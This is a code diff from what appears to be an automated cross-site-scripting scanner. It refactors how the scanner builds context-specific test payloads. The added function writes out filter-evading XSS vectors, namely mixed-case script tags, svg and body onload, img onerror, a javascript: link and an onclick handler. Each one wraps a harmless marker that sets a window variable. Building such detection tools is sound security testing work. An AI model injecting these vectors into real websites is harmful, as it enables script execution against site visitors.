@@ -7,46 +7,58 @@ const htmlCommentPayloads = require('./htmlCommentPayloads');
 const scriptPayloads = require('./scriptPayloads');
 const {reflectionTypes} = require('../constents');
 
-function generatePayloadCode(reflection) {
-    const variableName = generateRandomJsKeySelector();
-    const jsCode = `window[${variableName}]=1;`;
-    const assert = `return window[${variableName}]`;
+function generateHtmlElements(jsCode, tagClass) {
+    return [{
+        tag: `<SvG/onload=${jsCode}>`,
+        trigger: null,
+    }, {
+        tag: `<scRiPT>${jsCode}</SCrIpT>`,
+        trigger: null,
+    }, {
+        tag: `<iMG/src=/ onerror=${jsCode}>`,
+        trigger: null,
+    }, {
+        tag: `<bODy/onload=${jsCode}>`,
+        trigger: null,
+    }, {
+        tag: `<a/class=${tagClass} href=jaVascRIPt:void(${jsCode})/>`,
+        trigger: getTriggerCodeForClass(tagClass,'click'),
+    }, {
+        tag: `<p/class=${tagClass} onclick=${jsCode}/>`,
+        trigger: getTriggerCodeForClass(tagClass,'click'),
+    }];
+}
 
-    const scriptTag = `<scRiPT>${jsCode}</SCrIpT>`;
-    const imgTag = `<img src="/" onerror="${jsCode}">`;
-
-    const tagClass = generateRandomClass();
-    const aTag = `<a class="${tagClass}" href="jaVascRIPt:void(${jsCode});"></a>`;
-    const pTag = `<p class="${tagClass}" onclick="${jsCode}"></p>`;
-    const tagTrigger = getTriggerCodeForClass(tagClass);
-
-    switch (reflection.type) {
+function generatePayloadsWithCode(data) {
+    switch (data.reflection.type) {
         case  reflectionTypes.HTML_TAG:
-            return htmlTagPayloads({
-                scriptTag, imgTag, aTag, pTag, tagTrigger, assert,
-            });
+            return htmlTagPayloads(data);
         case reflectionTypes.HTML_NORMAL_ATTRIBUTE:
-            return htmlNormalAttributePayloads({
-                reflection, scriptTag, imgTag, aTag, pTag, tagTrigger, assert,
-            })
+            return htmlNormalAttributePayloads(data)
         case reflectionTypes.HTML_HREF_ATTRIBUTE:
-            return htmlHrefAttributePayloads({
-                jsCode, scriptTag, imgTag, aTag, pTag, tagTrigger, assert,
-            });
+            return htmlHrefAttributePayloads(data);
         case reflectionTypes.HTML_EXECUTABLE_ATTRIBUTE:
-            return htmlExecuteAttributePayloads({
-                reflection, jsCode, scriptTag, imgTag, aTag, pTag, tagTrigger, assert,
-            });
+            return htmlExecuteAttributePayloads(data);
         case reflectionTypes.HTML_COMMENT:
-            return htmlCommentPayloads({
-                scriptTag, imgTag, aTag, pTag, tagTrigger, assert,
-            });
+            return htmlCommentPayloads(data);
         case reflectionTypes.SCRIPT:
-            return scriptPayloads({
-                jsCode, scriptTag, imgTag, aTag, pTag, tagTrigger, assert,
-            });
+            return scriptPayloads(data);
     }
     return [];
+}
+
+function generatePayloadCode(reflection) {
+    const variableName = generateRandomJsKeySelector();
+    const jsCode = `window[${variableName}]=1`;
+    const assert = `return window[${variableName}]`;
+
+    const tagClass = generateRandomClass();
+    const htmlElements = generateHtmlElements(jsCode, tagClass);
+
+    return generatePayloadsWithCode({reflection, jsCode, tagClass, htmlElements}).map(payload => ({
+        ...payload,
+        assert,
+    }));
 }
 
 function generatePayloads(reflections) {
